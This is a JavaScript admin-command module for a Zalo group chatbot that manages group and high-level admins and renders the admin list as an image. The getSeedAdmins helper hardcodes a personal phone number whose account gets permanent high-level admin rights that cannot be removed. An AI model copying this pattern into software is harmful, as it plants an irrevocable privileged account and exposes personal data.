// --- IMPORT CŨ ---
import { writeGroupSettings } from "../../utils/io-json.js";
import { readFileSync, writeFileSync, existsSync } from "fs";
import { join, resolve } from "path";
import {
  sendMessageComplete,
  sendMessageInsufficientAuthority,
  sendMessageQuery,
  sendMessageWarning,
} from "../../Nqduan-service/chat-zalo/chat-style/chat-style.js";
import { getGlobalPrefix } from "../../Nqduan-service/service.js";
import { removeMention } from "../../utils/format-util.js";
import { clearImagePath } from "../../utils/canvas/index.js";
import { getBotInfo } from "../../utils/env.js";

// --- IMPORT MỚI ĐỂ VẼ ẢNH ---
import { createCanvas, loadImage } from "canvas";
import fs from "fs/promises";
import path from "path";
import { MessageType } from "zlbotdqt";

// --- IMPORT MỚI ĐỂ LẤY DATA VÀ CONTEXT ---
import { getUserInfoData } from "../../Nqduan-service/info-service/user-info.js";
import { appContext } from "../../api-zalo/context.js";

const botInfo = await getBotInfo(); // Lấy thông tin config bot từ env.js
const adminFilePath = botInfo.adminFilePath; // Đường dẫn đến file admin cấp cao (admin_info-botName.json)

// =================================================================
// --- HÀM HELPER: LẤY 2 ADMIN SEED CỐ ĐỊNH (TỪ INIT-ADMIN.JS) ---
// =================================================================

/**
 * Lấy danh sách UID của các admin Cấp cao được thêm tự động (Bot UID + UID từ SĐT cố định trong init-admin.js).
 * @param {Object} api - Đối tượng API (cần cho api.findUser)
 * @returns {Promise<string[]>} Mảng chứa UID của các admin seed.
 */
async function getSeedAdmins(api) {
  const seedAdmins = [];
  if (appContext.uid) {
    seedAdmins.push(appContext.uid); // UID của bot
  }
  try {
    const adminSearch = await api.findUser("+84328743417 ");
    const adminUid = adminSearch?.uid;
    if (adminUid) {
      seedAdmins.push(adminUid); // UID từ SĐT cố định
    }
  } catch (e) {
    console.debug(`Lỗi khi tìm admin main: ${e.message}`);
  }
  return [...new Set(seedAdmins)].filter((id) => id);
}

// =================================================================
// --- HÀM HELPER: LẤY ADMIN BOT CHA (TỪ CONFIG FILE - env.js) ---
// =================================================================

/**
 * Lấy danh sách UID của Admin Bot Cha (Thường là bot owner/admin chính được khai báo trong config file).
 * @param {Object} botInfo - Dữ liệu config bot từ getBotInfo()
 * @returns {string[]} Mảng chứa UID của Admin Bot Cha.
 */
function getMainAdmins(botInfo) {
  let mainAdmins = [];

  // Kiểm tra trường hợp Main Admin được lưu dưới dạng danh sách (ví dụ: main_admin_list hoặc adminList)
  if (botInfo.main_admin_list && Array.isArray(botInfo.main_admin_list)) {
    mainAdmins = mainAdmins.concat(botInfo.main_admin_list);
  }
  if (botInfo.adminList && Array.isArray(botInfo.adminList)) {
    mainAdmins = mainAdmins.concat(botInfo.adminList);
  }

  // Kiểm tra trường hợp Bot Owner/Admin được lưu dưới dạng UID đơn lẻ
  if (botInfo.ownerUID) {
    mainAdmins.push(botInfo.ownerUID);
  }

  // Loại bỏ các UID trùng lặp và rỗng
  return [...new Set(mainAdmins)].filter((id) => id);
}

/**
 * Hàm điều phối chính (ĐÃ CẬP NHẬT)
 */
export async function handleAdminCommand(
  api,
  message,
  groupAdmins,
  groupSettings,
) {
  const content = removeMention(message);
  const prefix = getGlobalPrefix();

  if (!content.startsWith(`${prefix}admin`)) {
    return false;
  }

  const parts = content.split(" ");
  const subcommand = parts[1]?.toLowerCase();

  // --- Hướng dẫn (Giữ nguyên) ---
  if (!subcommand) {
    const guideMessage = `
📝 HƯỚNG DẪN LỆNH ADMIN 📝
Vui lòng sử dụng lệnh admin theo cú pháp sau:
   『${prefix}admin list』: Xem danh sách admin (dạng ảnh).

1. Quản lý Admin Nhóm:
   『${prefix}admin add』 @user: Thêm admin cho nhóm.
   『${prefix}admin remove』 @user: Xóa admin của nhóm.

2. Quản lý Admin Cấp Cao (QTV):
   『${prefix}admin add qtv』 @user: Thêm QTV cấp cao.
   『${prefix}admin remove qtv』 @user: Xóa QTV cấp cao.
`.trim();

    await api.sendMessage(
      { msg: guideMessage, quote: message },
      message.threadId,
      message.type,
    );
    return true;
  }

  // Xử lý lệnh "admin list" (Giữ nguyên)
  if (subcommand === "list") {
    await handleListAdmin(api, message, groupSettings);
    return true;
  }

  // --- Các lệnh add/remove (ĐÃ CẬP NHẬT QUYỀN QTV) ---
  if (subcommand === "add" || subcommand === "remove") {
    const action = subcommand;
    const targetType = parts[2]?.toLowerCase();

    let highLevelAdmins = [];
    try {
      if (existsSync(adminFilePath)) {
        highLevelAdmins = JSON.parse(readFileSync(adminFilePath, "utf8"));
      }
    } catch (error) {
      console.error("Error reading admin file:", error);
      await sendMessageWarning(
        api,
        message,
        "Đã xảy ra lỗi khi kiểm tra quyền quản trị.",
      );
      return true;
    }

    const uidFrom = message.data.uidFrom;

    // --- LOGIC MỚI: Kiểm tra Admin Bot Cha (Từ env.js) ---
    const mainAdmins = getMainAdmins(botInfo);
    const isMainAdmin = mainAdmins.includes(uidFrom);

    if (targetType === "qtv") {
      const seedAdmins = await getSeedAdmins(api);

      // KIỂM TRA QUYỀN: Nếu là Admin Bot Cha (từ config) HOẶC là Admin Seed (từ init-admin.js)
      const hasQTVManagementPermission =
        isMainAdmin || seedAdmins.includes(uidFrom);

      if (!hasQTVManagementPermission) {
        const caption =
          "Quyền hạn chỉnh sửa admin cấp cao chỉ dành cho chính tài khoản này";
        await sendMessageInsufficientAuthority(api, message, caption);
        return true;
      }

      message.data.content = message.data.content.replace(/qtv/i, "").trim();
      // Dùng seedAdmins để bảo vệ 2 tài khoản này khỏi bị xóa
      await handleAddRemoveHighLevelAdmin(
        api,
        message,
        action,
        highLevelAdmins,
        seedAdmins,
      );
      return true;
    }
    // --- KẾT THÚC LOGIC KIỂM TRA ADMIN SEED VÀ BOT CHA CHO LỆNH QTV ---

    // Logic kiểm tra quyền cũ cho admin nhóm (chỉ cần là QTV bất kỳ)
    const isHighestLevelAdmin = highLevelAdmins.includes(uidFrom);
    if (!isHighestLevelAdmin) {
      const caption = "Chỉ có quản trị cấp cao mới được sử dụng lệnh này!";
      await sendMessageInsufficientAuthority(api, message, caption);
      return true;
    }

    await handleAddRemoveAdmin(api, message, groupSettings, action);
    writeGroupSettings(groupSettings);
    return true;
  }

  // Lệnh không hợp lệ (Giữ nguyên)
  await sendMessageWarning(
    api,
    message,
    `Không tồn tại lệnh "${prefix}admin ${subcommand}"\n Gõ "${prefix}admin" để xem hướng dẫn.`,
  );
  return true;
}

// =================================================================
// --- HÀM LIST ADMIN (Giữ nguyên) ---
// =================================================================
export async function handleListAdmin(api, message, groupSettings) {
  const threadId = message.threadId;
  let imagePath = null;

  try {
    const adminList = [];

    // 2. Lấy thông tin Quản trị Cấp cao (Key Vàng)
    const highLevelAdminIds =
      adminFilePath && existsSync(adminFilePath)
        ? JSON.parse(readFileSync(adminFilePath, "utf8"))
        : [];

    if (highLevelAdminIds.length > 0) {
      const adminPromises = highLevelAdminIds.map((id) =>
        getUserInfoData(api, id).catch((e) => {
          console.error(
            `[AdminList] Lỗi lấy info QTV Cấp cao ${id}: ${e.message}`,
          );
          return null;
        }),
      );
      const adminInfos = (await Promise.all(adminPromises)).filter(
        (info) => info !== null,
      );

      for (const info of adminInfos) {
        adminList.push({
          ...info,
          role: "Quản trị Cấp cao",
          keyType: "gold",
        });
      }
    }

    // 3. Lấy thông tin Quản trị viên nhóm (Key Bạc)
    const groupAdminIds =
      groupSettings[threadId] && groupSettings[threadId].adminList
        ? Object.keys(groupSettings[threadId].adminList)
        : [];

    if (groupAdminIds.length > 0) {
      const adminPromises = groupAdminIds.map((id) =>
        getUserInfoData(api, id).catch((e) => {
          console.error(
            `[AdminList] Lỗi lấy info QTV Nhóm ${id}: ${e.message}`,
          );
          return null;
        }),
      );
      const adminInfos = (await Promise.all(adminPromises)).filter(
        (info) => info !== null,
      );

      for (const info of adminInfos) {
        adminList.push({
          ...info,
          role: "Quản trị viên bot",
          keyType: "silver",
        });
      }
    }

    if (adminList.length === 0) {
      await sendMessageWarning(
        api,
        message,
        "Không tìm thấy thông tin quản trị viên nào !",
      );
      return;
    }

    // 4. Vẽ ảnh
    imagePath = await createAdminListImage(adminList);

    // 5. Gửi ảnh
    await api.sendMessage(
      { msg: "", attachments: [imagePath], ttl: 600000, quote: message },
      threadId,
      MessageType.GroupMessage,
    );
  } catch (error) {
    console.error(`[handleListAdmin] Lỗi: ${error.message}`);
    await sendMessageWarning(
      api,
      message,
      "Đã xảy ra lỗi khi lấy danh sách quản trị viên.",
    );
  } finally {
    // 6. Xóa file tạm
    if (imagePath) {
      await clearImagePath(imagePath);
    }
  }
}

// =================================================================
// --- CÁC HÀM CŨ (Giữ nguyên) ---
// =================================================================

async function handleAddRemoveAdmin(api, message, groupSettings, action) {
  const mentions = message.data.mentions;
  const threadId = message.threadId;
  const content = removeMention(message);

  if (!groupSettings[threadId]) {
    groupSettings[threadId] = { adminList: {} };
  }

  // Sửa logic xóa bằng STT
  if (action === "remove" && /\d+/.test(content)) {
    const indexMatch = content.match(/\d+/);
    if (indexMatch) {
      const index = parseInt(indexMatch[0]) - 1;

      const highLevelAdmins =
        adminFilePath && existsSync(adminFilePath)
          ? JSON.parse(readFileSync(adminFilePath, "utf8"))
          : [];
      const groupAdmins =
        groupSettings[threadId] && groupSettings[threadId].adminList
          ? Object.keys(groupSettings[threadId].adminList)
          : [];

      const combinedList = [
        ...highLevelAdmins.map((id) => ({ id, type: "gold" })),
        ...groupAdmins.map((id) => ({ id, type: "silver" })),
      ];

      if (index >= 0 && index < combinedList.length) {
        const target = combinedList[index];
        if (target.type === "silver") {
          const targetName =
            groupSettings[threadId].adminList[target.id] || target.id;
          delete groupSettings[threadId].adminList[target.id];
          await sendMessageComplete(
            api,
            message,
            `✅ Đã xóa ${targetName} khỏi danh sách quản trị bot của nhóm này.`,
          );
          return;
        } else {
          await sendMessageWarning(
            api,
            message,
            `⚠️ Không thể xóa Quản trị Cấp cao bằng lệnh này. Dùng "${getGlobalPrefix()}admin remove qtv".`,
          );
          return;
        }
      } else {
        await sendMessageWarning(
          api,
          message,
          `⚠️ Số thứ tự không hợp lệ. Vui lòng kiểm tra lại danh sách quản trị viên.`,
        );
        return;
      }
    }
  }

  if (!mentions || mentions.length === 0) {
    const caption =
      "Vui lòng đề cập (@mention) người dùng cần thêm/xóa khỏi danh sách quản trị bot.";
    await sendMessageQuery(api, message, caption);
    return;
  }

  for (const mention of mentions) {
    const targetId = mention.uid;
    const targetName = message.data.content
      .substring(mention.pos, mention.pos + mention.len)
      .replace("@", "");

    switch (action) {
      case "add":
        if (!groupSettings[threadId].adminList[targetId]) {
          groupSettings[threadId].adminList[targetId] = targetName;
          await sendMessageComplete(
            api,
            message,
            `✅ Đã thêm ${targetName} vào danh sách quản trị bot của nhóm này.`,
          );
        } else {
          await sendMessageWarning(
            api,
            message,
            `⚠️ ${targetName} đã có trong danh sách quản trị bot của nhóm này.`,
          );
        }
        break;
      case "remove":
        if (groupSettings[threadId].adminList[targetId]) {
          delete groupSettings[threadId].adminList[targetId];
          await sendMessageComplete(
            api,
            message,
            `✅ Đã xóa ${targetName} khỏi danh sách quản trị bot của nhóm này.`,
          );
        } else {
          await sendMessageWarning(
            api,
            message,
            `⚠️ ${targetName} không có trong danh sách quản trị bot của nhóm này.`,
          );
        }
        break;
    }
  }
}

/**
 * Xử lý thêm/xóa Admin Cấp cao (ĐÃ CẬP NHẬT LOGIC BẢO VỆ)
 * @param {Array} currentAdmins - Danh sách Admin Cấp cao hiện tại
 * @param {Array} seedAdmins - Danh sách 2 Admin Cấp cao được bảo vệ
 */
async function handleAddRemoveHighLevelAdmin(
  api,
  message,
  action,
  currentAdmins = [],
  seedAdmins = [],
) {
  const mentions = message.data.mentions;
  const content = removeMention(message);
  const adminFile = adminFilePath;

  // --- Xóa bằng Index ---
  if (action === "remove" && /\d+/.test(content)) {
    const indexMatch = content.match(/\d+/);
    if (indexMatch) {
      const index = parseInt(indexMatch[0]) - 1;
      if (index >= 0 && index < currentAdmins.length) {
        const targetId = currentAdmins[index];

        // >>> LOGIC BẢO VỆ (INDEX) <<<
        if (seedAdmins.includes(targetId)) {
          await sendMessageWarning(
            api,
            message,
            `❌ Chính tài khoản bot này và admin lader sẽ không thể bị xóa khỏi danh sách quản trị`,
          );
          return;
        }
        // >>> KẾT THÚC LOGIC BẢO VỆ <<<

        const userInfo = await api.getUserInfo([targetId]);
        const targetName =
          userInfo.unchanged_profiles?.[targetId]?.zaloName ||
          userInfo.changed_profiles?.[targetId]?.zaloName ||
          targetId;
        currentAdmins = currentAdmins.filter((id) => id !== targetId);

        try {
          writeFileSync(adminFile, JSON.stringify(currentAdmins, null, 2));
          await sendMessageComplete(
            api,
            message,
            `✅ Đã xóa ${targetName} khỏi danh sách quản trị cấp cao.`,
          );
        } catch (error) {
          console.error("Error writing admin file:", error);
          await sendMessageWarning(
            api,
            message,
            "❌ Đã xảy ra lỗi khi lưu thay đổi.",
          );
        }
        return;
      } else {
        await sendMessageWarning(
          api,
          message,
          `⚠️ Số thứ tự không hợp lệ. Vui lòng kiểm tra lại danh sách quản trị viên.`,
        );
        return;
      }
    }
  }

  // --- Xử lý @mention ---
  if (!mentions || mentions.length === 0) {
    const caption =
      "Vui lòng đề cập (@mention) người dùng cần thêm/xóa vào danh sách Quản trị viên Cấp Cao.";
    await sendMessageQuery(api, message, caption);
    return;
  }

  for (const mention of mentions) {
    const uid = mention.uid;
    const targetName = message.data.content
      .substring(mention.pos, mention.pos + mention.len)
      .replace("@", "");

    switch (action) {
      case "add":
        if (!currentAdmins.includes(uid)) {
          currentAdmins.push(uid);
          await sendMessageComplete(
            api,
            message,
            `✅ Đã thêm ${targetName} vào quản trị cấp cao.`,
          );
        } else {
          await sendMessageWarning(
            api,
            message,
            `⚠️ ${targetName} đã có trong danh sách quản trị cấp cao.`,
          );
        }
        break;
      case "remove":
        if (currentAdmins.includes(uid)) {
          // >>> LOGIC BẢO VỆ (@MENTION) <<<
          if (seedAdmins.includes(uid)) {
            await sendMessageWarning(
              api,
              message,
              `❌ Chính tài khoản bot này và admin lader sẽ không thể bị xóa khỏi danh sách quản trị`,
            );
            continue;
          }
          // >>> KẾT THÚC LOGIC BẢO VỆ <<<

          currentAdmins = currentAdmins.filter((id) => id !== uid);
          await sendMessageComplete(
            api,
            message,
            `✅ Đã xóa ${targetName} khỏi quản trị cấp cao.`,
          );
        } else {
          await sendMessageWarning(
            api,
            message,
            `⚠️ ${targetName} không có trong danh sách quản trị cấp cao.`,
          );
        }
        break;
    }
  }

  try {
    writeFileSync(adminFile, JSON.stringify(currentAdmins, null, 2));
  } catch (error) {
    console.error("Error writing admin file:", error);
    await sendMessageWarning(
      api,
      message,
      "❌ Đã xảy ra lỗi khi lưu thay đổi danh sách quản trị.",
    );
  }
}

/**
 * Hàm vẽ ảnh danh sách Admin (Phong cách dọc)
 * @param {Array} admins - Danh sách admin (đã gộp Cấp cao và Nhóm)
 */
async function createAdminListImage(admins) {
  const limitedAdmins = admins
    .sort((a, b) => {
      if (a.keyType === "gold" && b.keyType !== "gold") return -1;
      if (a.keyType !== "gold" && b.keyType === "gold") return 1;
      return a.name.localeCompare(b.name);
    })
    .slice(0, 50);

  const width = 660;
  const itemHeight = 100;
  const headerHeight = 100;
  const height = headerHeight + limitedAdmins.length * itemHeight + 20;

  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext("2d");

  const gradient = ctx.createLinearGradient(0, 0, 0, height);
  gradient.addColorStop(0, "#004e92");
  gradient.addColorStop(1, "#000428");
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, width, height);

  ctx.font = "bold 36px 'BeVietnamPro', 'Segoe UI', Tahoma, Arial";
  ctx.fillStyle = "#ffffff";
  ctx.textAlign = "center";
  ctx.textBaseline = "middle";
  ctx.fillText("Admin Manager", width / 2, headerHeight / 2);

  const avatars = await Promise.all(
    limitedAdmins.map(async (admin) => {
      try {
        return admin.avatar ? await loadImage(admin.avatar) : null;
      } catch {
        return null;
      }
    }),
  );

  const moveRight = 30;

  limitedAdmins.forEach((admin, index) => {
    const yPos = headerHeight + index * itemHeight + 10;
    const centerY = yPos + (itemHeight - 10) / 2;

    ctx.fillStyle = "rgba(255, 255, 255, 0.05)";
    ctx.beginPath();
    ctx.roundRect(10, yPos, width - 20, itemHeight - 10, 10);
    ctx.fill();

    const avatarSize = 70;
    const avatarX = 20 + moveRight;
    const avatarY = centerY - avatarSize / 2;
    const cornerRadius = 10;

    ctx.save();
    ctx.beginPath();
    ctx.roundRect(avatarX, avatarY, avatarSize, avatarSize, cornerRadius);
    ctx.clip();

    if (avatars[index]) {
      ctx.drawImage(avatars[index], avatarX, avatarY, avatarSize, avatarSize);
    } else {
      ctx.fillStyle = "#555";
      ctx.fillRect(avatarX, avatarY, avatarSize, avatarSize);
    }

    const numberSize = 20;
    const numberX = avatarX + avatarSize - numberSize;
    const numberY = avatarY + avatarSize - numberSize;

    ctx.fillStyle = admin.keyType === "gold" ? "#FFD700" : "#C0C0C0";
    ctx.beginPath();
    ctx.roundRect(numberX, numberY, numberSize, numberSize, [
      cornerRadius,
      0,
      cornerRadius,
      0,
    ]);
    ctx.fill();

    ctx.fillStyle = "#000000";
    ctx.font = "bold 12px 'BeVietnamPro', 'Segoe UI', Tahoma, Arial";
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.fillText(
      `${index + 1}`,
      numberX + numberSize / 2,
      numberY + numberSize / 2 + 1,
    );

    ctx.restore();

    if (admin.keyType === "gold") {
      ctx.strokeStyle = "#FFD700";
      ctx.lineWidth = 4;
    } else {
      ctx.strokeStyle = "#C0C0C0";
      ctx.lineWidth = 3;
    }
    ctx.beginPath();
    ctx.roundRect(avatarX, avatarY, avatarSize, avatarSize, cornerRadius);
    ctx.stroke();

    const textX = avatarX + avatarSize + 20;

    ctx.font = "bold 26px 'BeVietnamPro', 'Segoe UI', Tahoma, Arial";
    ctx.fillStyle = "#ffffff";
    ctx.textAlign = "left";
    ctx.textBaseline = "middle";
    ctx.fillText(admin.name, textX, centerY - 15);

    ctx.font = "20px 'BeVietnamPro', 'Segoe UI', Tahoma, Arial";

    if (admin.keyType === "gold") {
      ctx.fillStyle = "#FFD700";
    } else {
      ctx.fillStyle = "#cccccc";
    }

    ctx.fillText(admin.role, textX, centerY + 20);
  });

  await fs.mkdir(path.resolve("./assets/temp"), { recursive: true });
  const filePath = path.resolve(`./assets/temp/admin_list_${Date.now()}.png`);
  await fs.writeFile(filePath, canvas.toBuffer("image/png"));
  return filePath;
}
